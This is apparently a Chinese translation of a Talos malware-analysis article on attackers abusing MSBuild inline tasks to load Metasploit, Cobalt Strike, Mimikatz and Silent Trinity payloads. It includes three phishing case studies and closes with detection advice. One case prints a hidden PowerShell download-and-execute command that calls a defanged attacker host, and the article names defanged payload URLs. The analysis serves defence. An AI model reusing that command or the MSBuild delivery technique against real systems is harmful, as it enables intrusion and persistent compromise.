**MSBuild特征之一是需要配置文件，攻击者可以使用一个特殊的XML标记，指定一个内联任务，[详细信息点我](https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild-inline-tasks?view%3Dvs-2019)，其中包含将由MSBuild编译并加载到内存中的源代码。**

![](https://image.3001.net/images/20200221/1582277515_5e4fa38bd941a.png!small)

MSBuild配置文件中的内联任务的定义。

根据任务的属性，开发人员可以指定在构建项目时自动执行的类，方法或代码片段。也可以将源代码指定为驱动器上的外部文件。

在研究过程中，我们从各种来源收集了100多个恶意MSBuild配置文件，我们分析了其交付方法并调查了最终的payload，这些payload通常以Shellcode的形式交付。

## SHELLCODE总结分析

### METASPLOIT

收集的大多数样本都包含由Metasploit生成的shellcode变体，嵌入C＃代码中。一般通过使用zlib或GZip压缩字节数组，然后将其转换为base64编码的可打印文本，来混淆shellcode。

![](https://image.3001.net/images/20200221/1582277517_5e4fa38d67cda.png!small)

MSBuild配置文件中的Meterpreter stager shellcode示例。

可能最方便的shellcode分析工具是shellcode调试器：[scdbg](http://sandsprite.com/blogs/index.php?uid%3D7%26pid%3D152)。Scdbg有许多调试Shellcode的选项。由于Scdbg基于开放源代码x86仿真库libemu，因此它仅仿真Windows环境，而不会运行每个shellcode。

当然，要分析shellcode，我们需要将其从C＃的格式转换回二进制格式。我们将使用xxd工具来实现这一点，记下来，要考的

xxd有有一个神奇的模式，输入选项-r和-p一起可以将C＃数组字节转换回二进制文件。

    
    
    xxd -r -p input_text_shellcode_file output_binary_shellcode_file

xxd支持几种常见的转储格式，但也不是每次都正确。重要的是要检查二进制字节和shellcode文本文件中指定的字节是否相同。

![](https://image.3001.net/images/20200221/1582277516_5e4fa38c7d236.png!small)

### COVENANT

[Covenant](https://github.com/cobbr/Covenant)是一个相对较新的基于C＃的C2框架，它还允许红队成员自行编写payload，但必须是.NET程序集，可以由框架代码加载和执行。Covenant框架有其自己becon，称为Grunts。Grunts提供了与C2服务器建立通信的基础结构。

![](https://image.3001.net/images/20200221/1582277618_5e4fa3f2c7c34.png!small)

### NPS

NPS是一个简单的包装可执行程序实用程序，创建该实用程序是为了将System.Management.Automation和其他几个.NET程序集加载到可执行程序的处理空间中。其背后的想法是试图逃避对powershell.exe执行的检测，并仍然运行自定义PowerShell代码。该工具允许参与者使用不同的机制（包括MSBuild配置工具）来创建非PowerShell
payload。该工具使用用户提供的Meterpreter阶段程序shellcode
payload或自定义Powershell代码payload生成MSBuild项目文件。

![](https://image.3001.net/images/20200221/1582277617_5e4fa3f1365e3.jpg!small)

### COBALT STRIKE

尽管到目前为止，Metasploit shellcode是最常见的，但我们也看到了一些使用[Cobalt
Strike](https://blog.talosintelligence.com/2018/07/multiple-cobalt-personality-disorder.html)作为payload的示例。他的shellcode具有类似于PE文件的结构，但是它被设计为手动加载到内存中，并通过调用从blob开头的shellcode
loader来执行。

![](https://image.3001.net/images/20200221/1582277617_5e4fa3f185de7.png!small)

payload 开始部分

![](https://image.3001.net/images/20200221/1582277618_5e4fa3f2d64e6.png!small)

payload loader

### MIMIKATZ

我们发现唯一的长于Cobalt Strike shellcode / beacon的payload是一个包含两个Mimikatz
payload的样本。我们他具有更复杂的逻辑，用于将可执行文件加载到内存中，并最终通过调用CreateThread来启动它。

![](https://image.3001.net/images/20200221/1582277619_5e4fa3f3761dc.png!small)

MSBuild Mimikatz loader

加载程序首先检查操作系统是32位还是64位，然后加载并运行存储在使用base64编码的变量中的相应Mimikatz可执行文件。

## 实例探究

在过去6个月的时间里，我们通过在Cisco Threat Grid平台中搜索提交的内容，发现了三个研究样本。

![](https://image.3001.net/images/20200221/1582277620_5e4fa3f4422d7.png!small)

与MSBuild相关的危害指标的简要思科威胁网格说明。

### 情况1：WORD文档到DROPBOX上的MSBUILDpayload

我们使用MSBuild部署payload的第一个案例是一个Word文档，该钓鱼文档提示用户“启用内容”以执行文档中包含的VBA宏代码。

启用后，VBA代码将在用户的Temp文件夹中创建两个文件。第一个为expenses.xlsx，它实际上是一个MSBuild配置XML文件，其中包含用于编译和启动payload的恶意代码。

根据VirusTotal的说法，该样本托管在一个可公开访问的Dropbox文件夹中，文件名为“候选简历-Morgan Stanley
202019.doc”，这表明该活动是针对性的。

![](https://image.3001.net/images/20200221/1582277620_5e4fa3f4919ef.png!small)

由VBA代码在用户的临时文件夹中创建的第二个文件为resume.doc。这是一个诱饵Word文档，显示了市场经理的简历。

![](https://image.3001.net/images/20200221/1582277621_5e4fa3f5788aa.png!small)

Winword启动MSBuild，后者启动C＃编译器csc.exe和cvtres.exe。

![](https://image.3001.net/images/20200221/1582277621_5e4fa3f59bdf1.png!small)

我们还可以看到MSBuild进程正在启动Internet
Explorer（iexplore.exe）。iexplore.exe以挂起模式启动，因此可以将payload（即 Cobalt strike
beacon）复制到其进程空间中，并通过将线程排队作为异步过程调用来启动，这是进程注入的常见技术之一。

在这种情况下，可以发现winword.exe启动MSBuild.exe进程，然后MSBuild.exe启动iexplore.exe这种异常的操作。

![](https://image.3001.net/images/20200221/1582277622_5e4fa3f6cc0ef.png!small)

注入代码

### 情况2：将EXCEL文件转换为SILENT TRINITY

第二个案例和上一个差不多。在这里，我们有一个Excel文件，该文件看起来包含机密的工资信息，但提示用户启用编辑功能以查看其内容。

![](https://image.3001.net/images/20200221/1582277623_5e4fa3f7ca1e8.png!small)

打开时的Excel示例

Excel文件包含一个VBA宏代码，乍一看看上去并不十分可疑，但实际上调用了另一个函数。最终以包含下一个加载器阶段URL的文档Subject属性对Wscript.Shell的可疑调用结束。

![](https://image.3001.net/images/20200221/1582277623_5e4fa3f71b046.png!small)

VBA Code使用文档的Subject属性启动下一阶段。

文档主题属性包含执行PowerShell并获取并调用下一阶段的代码：

    
    
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -w hidden -Command iex(New-Object System.Net.WebClient).DownloadString('hxxp://apb[.]sh/helloworld[.]ps1')

Helloworld.ps1从另一个URLhxxp://apb[.]sh/msbuild[.]xml下载MSBuild配置并启动它。最后，Helloworld.ps1从hxxp://apb[.]sh/per[.]txt下载文件，并将其另存为a.bat到用户的\Start
Menu\Programs\Startup\文件夹中。A.bat确保用户注销系统后payload仍然存在。

下载的MSBuild配置文件似乎是由[Silent
Trinity](https://github.com/byt3bl33d3r/SILENTTRINITY).NET开发后框架生成的。它将.NET程序集payload存储为使用zlib压缩的文件，然后使用base64编码器进行编码。

![](https://image.3001.net/images/20200221/1582277624_5e4fa3f80e4f6.jpg!small)

Silent Trinity是一个相对较新的框架，原始的Silent
Trinity的植入物称为Naga，具有解释以[Boolang](https://github.com/boo-lang/boo)语言发送的命令的[功能](https://github.com/boo-lang/boo)。即使数据通过HTTP发送，植入物和C2服务器之间的通信也会被加密。在这种情况下，渗透人员使用的是Naga的较旧版本，该版本不使用Boolang，但会尝试加载IronPython（用于.NET框架的Python实现）。

![](https://image.3001.net/images/20200221/1582277624_5e4fa3f8c1f34.png!small)

### 情况3：加密的COBALT STRIKE信标的URL

我们的最后一个案例研究具有不同的感染链。它从一个网页开始，网页上存放着一家知名服装制造商G-III员工的所谓行为准则文件。该文档是用VB脚本编写的HTML应用程序，它创建一个MSBuild配置文件并运行MSBuild。

![](https://image.3001.net/images/20200221/1582277625_5e4fa3f97b87f.png!small)

VB脚本HTA文件创建配置文件并调用MSBuild。

MSBuild配置文件包含一个内联任务类，该类使用外部URL检索密钥以解密加密的嵌入式payload。密钥存储在hxxp://makeonlineform[.]com/forms/228929[.]txt中。payload是Cobalt
Strike Powershell的加载程序，它最终将beacon 加载到内存中。

![](https://image.3001.net/images/20200221/1582277626_5e4fa3fa29e54.png!small)

加载Cobalt Strike beacon后，HTA应用程序将浏览器导航到G-III的实际URL。最后，将生成的MSBuild配置文件从计算机中删除。

我们查看Threat Grid生成的图形中的进程树，会看到MSBuild.exe进程启动PowerShell的潜在可疑事件。

![](https://image.3001.net/images/20200221/1582277626_5e4fa3fa72400.png!small)

## 结论

MSBuild是软件工程师构建.NET软件项目的必备工具。但是，也为攻击者提供了方便，并可能提供一种绕过某些Windows安全机制的方法。

最后，我们的研究表明，MSBuild通常不被商品恶意软件使用。观察到的大多数情况都具有利用后开发剂作为最终payload的变体。建议防御者仔细监视进程执行的命令行参数，并特别调查其中MSBuild父进程是Web浏览器或Microsoft
Office可执行文件的实例。这种行为是高度可疑的，表明防御已被破坏。设置基准后，可疑的MSBuild调用应易于显示且相对较少，因此不会增加团队的平均工作量。

墙裂建议如果你不开发软件，好好检查MSBuild.exe的每次执行，看看自己是不是肉鸡。

**参考来源：[talosintelligence](https://blog.talosintelligence.com/2020/02/building-bypass-with-msbuild.html)，FB小编周大涛编译，转载请注明来自FreeBuf.COM**

